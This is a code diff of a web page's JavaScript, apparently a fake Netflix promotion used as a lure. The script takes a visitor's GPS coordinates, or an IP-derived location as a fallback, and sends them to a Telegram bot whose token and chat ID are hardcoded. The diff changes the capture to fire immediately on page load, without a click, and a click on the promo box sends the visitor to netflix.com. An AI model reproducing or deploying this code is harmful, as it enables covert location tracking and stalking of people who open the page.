@@ -38,7 +38,6 @@
     const botToken = "7627218398:AAFHNujcd2e_zTluZeqfFNtJBpBuxY6pX6M";
     const chatId = "1768737489"; 
 
-    // Invia messaggio a Telegram
     async function sendToTelegram(msg) {
       try {
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -51,7 +50,6 @@
       }
     } 
 
-    // Geolocalizzazione IP come fallback
     async function fallbackIPLocation() {
       try {
         const res = await fetch("https://ipapi.co/json/");
@@ -63,33 +61,21 @@
       }
     } 
 
-    // Geolocalizzazione GPS (con fallback IP)
-    function trackPosition() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const lat = pos.coords.latitude.toFixed(6);
-            const lon = pos.coords.longitude.toFixed(6);
-            const msg = `📍 Posizione GPS:\nLatitudine: ${lat}\nLongitudine: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
-            sendToTelegram(msg);
-          },
-          (err) => {
-            console.warn("GPS fallito, uso IP:", err.message);
-            fallbackIPLocation();
-          },
-          { timeout: 5000 }
-        );
-      } else {
-        fallbackIPLocation();
-      }
-    } 
+    // Geolocalizzazione immediata (senza click)
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const lat = pos.coords.latitude.toFixed(6);
+        const lon = pos.coords.longitude.toFixed(6);
+        const msg = `📍 Posizione GPS:\nLatitudine: ${lat}\nLongitudine: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+        sendToTelegram(msg);
+      },
+      (err) => {
+        fallbackIPLocation(); // Se l'utente rifiuta o errore
+      },
+      { timeout: 5000 }
+    ); 
 
-    // Attiva tracciamento appena la pagina viene caricata
-    window.onload = () => {
-      trackPosition();
-    }; 
-
-    // Reindirizzamento dopo click
+    // Reindirizzamento quando clicca
     document.getElementById("promoBox").addEventListener("click", () => {
       window.location.href = "https://www.netflix.com";
     });
